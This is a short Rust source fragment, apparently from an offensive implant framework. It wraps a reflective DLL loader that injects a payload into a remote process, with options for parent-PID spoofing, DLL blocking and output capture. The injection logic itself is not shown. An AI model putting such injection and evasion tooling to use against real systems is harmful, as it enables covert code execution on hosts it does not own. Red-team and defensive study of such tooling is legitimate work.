pub unsafe fn reflective_loader(
    start_commandline: *const u8,
    start_commandline_len: usize,
    reflective_loader_name: *const u8,
    reflective_loader_name_len: usize,
    data: *const u8,
    data_len: usize,
    param: *const u8,
    param_len: usize,
    ppid: u32,
    block_dll: bool,
    timeout: u32,
    is_need_output: bool,
) -> Vec<u8> {
    #[cfg(feature = "prebuild")]
    {
        let ret = crate::win::kit::ReflectiveLoader(
            start_commandline,
            start_commandline_len,
            reflective_loader_name,
            reflective_loader_name_len,
            data,
            data_len,
            param,
            param_len,
            ppid,
            block_dll,
            timeout,
            is_need_output,
        );
        let str = String::from_raw_parts(ret.data, ret.len, ret.capacity);
        str.as_bytes().to_vec()
    }
    #[cfg(feature = "source")]
    {
        use malefic_win_kit::pe::ReflectiveLoader::LoadRemoteLibraryR;
        match LoadRemoteLibraryR(
            start_commandline,
            start_commandline_len,
            reflective_loader_name,
            reflective_loader_name_len,
            data,
            data_len,
            param,
            param_len,
            ppid,
            block_dll,
            timeout,
            is_need_output,
        ) {
            Ok(ret) => {
                ret
            },
            Err(e) => {
                e.as_bytes().to_vec()
            }
        }
    }
}
    